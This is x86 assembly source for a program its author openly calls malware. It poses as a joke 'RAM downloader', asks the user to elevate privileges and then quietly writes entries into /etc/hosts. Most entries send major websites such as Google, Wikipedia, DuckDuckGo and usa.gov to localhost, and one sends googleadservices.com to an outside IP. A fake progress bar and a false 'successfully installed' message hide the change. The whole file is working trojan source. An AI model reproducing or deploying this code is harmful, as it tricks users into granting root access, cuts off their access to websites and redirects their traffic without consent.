; Linux RAM Downloader
; By: Noah Mosel 
;
; INTRO:
; This is a malware which modifies the hosts file, but is disguised
;       as a RAM downloader, which plays homage to the claims of 
;       SoftRAM in 1995
;
; FUNCTIONS:
; The user is welcomed to the RAM downloader.
; The program then will attempt to open the hosts file on linux.
; If it fails, it will ask the user to elevate privilges.
; If it succeeds, then it will ask the user how much RAM they would like to install
; It will then show that the install has started. However, it is just editing the hosts file
; It will add a handful of entries to the OS DNS configuration. 
; Essentially removing the ability to access a handful of popular websites.
; This is all hidden behind a fake progress bar, which will complete after roughly 100 seconds
; This all ends with a final message informing the user that the Install has finished, and was successful

%include "asm_io.inc"
%include "file_io.inc"

segment .data
welcome_string db "Welcome to the RAM downloader!", 0
input_string db "How much RAM would you like to download? (in GB) > ", 0
install_start db "Install started! Please wait...", 0
install_finish db "Install finished! RAM was successfully installed!", 0
progbar db ".", 0
null_char db " 7", 0
file_path db "/etc/hosts", 0
write_string db 13,"127.0.0.1 www.google.com", 13, "127.0.0.1 google.com", 13, "127.0.0.1 www.amazon.com", 13, "127.0.0.1 amazon.com", 13, "127.0.0.1 facebook.com", 13, "127.0.0.1 www.facebook.com", 13, "127.0.0.1 twitter.com", 13, "127.0.0.1 www.twitter.com", 13, "127.0.0.1 instagram.com", 13, "127.0.0.1 www.instagram.com", 13, "127.0.0.1 yahoo.com", 13, "127.0.0.1 www.yahoo.com", 13, "127.0.0.1 youtube.com", 13, "127.0.0.1 www.youtube.com", 13, "66.254.114.38 googleadservices.com", 13, "127.0.0.1 hulu.com", 13, "127.0.0.1 usa.gov", 13, "127.0.0.1 duckduckgo.com", 13, "127.0.0.1 wikipedia.org", 13, "127.0.0.1 reddit.com", 0
error_file db "Error occurred! Please elevate privileges!", 0
lastTime dd 0
currCount db 100

segment .bss
input1 resd 1
fileId resb 1
info resb 32

segment .text
        global  asm_main, randgen
asm_main:
        enter   0,0               ; setup routine
        pusha

        mov eax, welcome_string
        call print_string
        call print_nl

        mov eax, file_path      ;file to open
        call open_file
        cmp eax, 0
        JL file_error           ;skip write if error
        mov [fileId], eax       ;save file descriptor

        mov ebx, [fileId]
        call seek_file

        mov eax, write_string
        mov ebx, [fileId]       ;file descriptor
        call write_to_file
start:
        mov eax, input_string
        call print_string
        
        call read_int
        mov [input1], eax

        mov eax, install_start
        call print_string
        call print_nl

        call progress_bar

        call print_nl
        mov eax, install_finish
        call print_string
end:
        call print_nl
        popa
        mov     eax, 0            ; return back to C
        leave                     
        ret

; Returns the current system time in eax
time:
        mov eax, 13     ; time syscall
        xor ebx, ebx
        int 0x80
        ret

; Prints error if the file cant be opened and stops program
file_error:
        mov eax, error_file
        call print_string
        JMP end

; Displays progress bar to make it seem as though something is happening
progress_bar:
        call time
        mov dword [lastTime], eax
check_time1:
        call time
        cmp eax, [lastTime]
        JE check_time1
        mov [lastTime], eax
        xor eax, eax

        mov eax, 4                   ; system call for write()
        mov ebx, 1                   ; file descriptor for standard output
        mov ecx, progbar
        mov edx, 2
        int 0x80                     

        mov ecx, [currCount]
        dec ecx
        mov [currCount], ecx
        cmp ecx, 0
        JG check_time1
        ret